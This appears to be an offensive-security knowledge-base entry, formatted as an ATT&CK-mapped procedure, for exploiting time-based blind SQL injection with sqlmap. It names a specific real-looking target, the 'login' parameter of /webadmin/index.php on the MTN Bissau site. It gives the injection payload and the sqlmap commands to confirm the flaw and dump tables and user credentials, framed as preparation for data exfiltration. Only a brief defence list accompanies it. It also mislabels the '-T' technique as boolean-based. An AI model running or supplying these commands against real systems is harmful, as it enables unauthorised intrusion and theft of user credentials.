---
id: proc-uuid-2
tags:
  - sqli
  - automation
  - blind-sqli
  - sqlmap
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-time-based-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.142Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Automated-SQL-Injection-Confirmation-with-sqlmap

## Summary

This procedure uses sqlmap to automate the detection and confirmation of SQL injection vulnerabilities, focusing on time-based blind techniques to verify injectable parameters without relying on error messages.

## Description

Targeting the 'login' POST parameter in /webadmin/index.php of the MTN Bissau site, sqlmap injects payloads like SLEEP(5) to cause detectable delays in MySQL responses, confirming blind SQLi. Once verified, it can enumerate the database, tables, and extract data such as user credentials. The tool resumes from stored sessions and identifies the backend as MySQL, enabling arbitrary query execution for critical impact.

## Requirements

1. sqlmap installed and configured
2. Captured HTTP request file (e.g., from Burp or manual curl)
3. Network access to the target endpoint
4. Patience for time-based testing (delays up to 5+ seconds per test)

## Defense

Defensive measures and detection strategies:

- Deploy Web Application Firewall (WAF) rules to block sqlmap-like payloads and anomalous delays
- Enable query logging in MySQL to detect SLEEP or unusual subqueries
- Rate-limit login attempts to prevent automated probing

## Objectives

1. Confirm SQLi vulnerability type (time-based blind)
2. Identify backend DBMS and injectable parameters
3. Prepare for data exfiltration by dumping sensitive information

## Instructions

### Step 1: Setup sqlmap Session

**Context**: Save the vulnerable POST request to a file for sqlmap to parse, including headers and parameters.

**Command** (No direct command; prepare file):

> Create 'request.txt' with the full HTTP POST request from manual testing, e.g., POST /webadmin/index.php ... login=user'&pass=uesse.

### Step 2: Run Time-Based Blind SQLi Test

**Context**: Execute sqlmap with time-based technique (-T for boolean-based blind) targeting the 'login' parameter to inject SLEEP payloads and measure delays.

**Command** ([[commands/sqlmap-time-based-payload]]):
```bash
sqlmap -r request.txt --dbms=mysql -p login --technique=T --risk=3 --level=5
```

> This command loads the request, assumes MySQL, focuses on 'login', and uses time-based payloads like ' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND '. Expected output: Detection of 5-second delay, payload confirmation, and vulnerability details.

### Step 3: Escalate to Enumeration

**Context**: If confirmed, enumerate database structure for further exploitation.

**Command** (Extension of sqlmap):
```bash
sqlmap -r request.txt --dbms=mysql -p login --tables --dump
```

> Dumps tables and data; success indicated by retrieved schema and records like user credentials.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-time-based-payload]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- sqli
- automation
- blind-sqli
- sqlmap
